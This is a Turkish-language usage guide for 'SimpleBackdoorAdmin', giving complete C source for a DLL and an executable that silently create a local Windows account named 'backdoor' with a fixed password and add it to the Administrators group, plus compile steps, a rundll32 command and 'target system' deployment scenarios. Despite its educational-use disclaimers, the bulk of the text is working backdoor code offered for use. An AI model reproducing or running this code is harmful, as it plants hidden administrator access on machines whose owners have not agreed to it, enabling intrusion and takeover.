# SimpleBackdoorAdmin Kullanım Rehberi

## SimpleBackdoorAdmin Nedir?

**SimpleBackdoorAdmin.dll** ve **SimpleBackdoorAdmin.exe**, Windows sistemlerinde kullanıcı eklemek ve bu kullanıcıya yönetici yetkileri atamak için kullanılan örnek araçlardır. Bu araçlar genellikle eğitim amaçlıdır ve yalnızca test ortamlarında kullanılmalıdır.

> **Önemli Not:** Bu araçlar yalnızca yetkili test ortamlarında kullanılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Gereksinimler

- **Hedef Sistem:** Windows işletim sistemi çalıştıran bir makine.
- **Geliştirme Araçları:** Visual Studio gibi bir C/C++ derleyici.

---

## Kodların Anlamı

### SimpleBackdoorAdmin.dll

Bu DLL, bir süreç tarafından yüklendiğinde bir kullanıcı hesabı oluşturur ve bu kullanıcıyı yönetici grubuna ekler.

**Temel İşlev:**
- `DllMain` fonksiyonu, DLL yüklendiğinde `net user` ve `net localgroup` komutlarını çalıştırır.
- **Kullanıcı:** `backdoor`
- **Parola:** `Password123!`

**Kod:**
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user backdoor Password123! /add");
        i = system ("net localgroup administrators backdoor /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

### SimpleBackdoorAdmin.exe

Bu uygulama, `net user` ve `net localgroup` komutlarını çalıştırarak aynı işlemi yapar. DLL'den farklı olarak doğrudan çalıştırılır.

**Kod:**
```c
#include <stdlib.h>

int main ()
{
  system("net user backdoor Password123! /add");
  system("net localgroup administrators backdoor /add");

  return 0;
}
```

---

## Kullanım

### 1. Derleme
1. Visual Studio veya benzeri bir IDE kullanarak projeyi oluşturun.
2. `SimpleBackdoorAdmin.dll` ve `SimpleBackdoorAdmin.exe` dosyalarını derleyin.

### 2. Çalıştırma

#### DLL'in Yüklenmesi
DLL'i bir uygulamaya yükleyerek çalıştırabilirsiniz. Örneğin:

```bash
rundll32.exe SimpleBackdoorAdmin.dll, DllMain
```

#### EXE'nin Çalıştırılması
EXE dosyasını çalıştırarak işlemi gerçekleştirin:

```bash
SimpleBackdoorAdmin.exe
```

---

## Örnek Senaryolar

### DLL Kullanımı
1. DLL dosyasını bir hedef sisteme yükleyin.
2. `rundll32` komutunu kullanarak çalıştırın.

### EXE Kullanımı
1. EXE dosyasını hedef sistemde çalıştırın.
2. `backdoor` adlı kullanıcı oluşturulacak ve yönetici grubuna eklenecektir.

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** Bu araçlar yalnızca güvenlik uzmanları ve yetkili sistem yöneticileri tarafından kullanılmalıdır.
- **Test Ortamı:** Üretim ortamında kullanılmadan önce test ortamında denenmelidir.
- **Loglama:** Çalıştırılan komutlar sistem loglarına kaydedilebilir. Yasalara uygun hareket edilmelidir.

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
